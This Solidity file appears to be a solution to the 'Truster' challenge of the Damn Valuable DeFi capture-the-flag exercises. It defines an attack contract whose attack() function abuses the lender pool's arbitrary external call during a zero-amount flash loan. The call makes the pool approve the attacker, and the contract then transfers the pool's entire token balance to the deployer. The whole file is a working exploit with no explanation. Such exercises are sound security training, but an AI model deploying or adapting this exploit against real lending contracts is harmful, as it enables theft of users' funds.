// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "../truster/TrusterLenderPool.sol";
import {ERC20} from "solmate/src/tokens/ERC20.sol";


contract TrusterLenderPoolHack {
    DamnValuableToken public immutable dvt;
    TrusterLenderPool public immutable lenderPool;
    address public immutable hacker;

    constructor(address _dvt, address _lenderPool) {
        dvt = DamnValuableToken(_dvt);
        lenderPool = TrusterLenderPool(_lenderPool);
        hacker = msg.sender;
    }

    function attack() public {
        bytes memory data = abi.encodeWithSelector(ERC20.approve.selector, address(this), dvt.balanceOf(address(lenderPool)));
        lenderPool.flashLoan(0, address(this), address(dvt), data);
        bool success = dvt.transferFrom(address(lenderPool), hacker, dvt.balanceOf(address(lenderPool)));

        if (!success) {
            revert();
        }
    }
}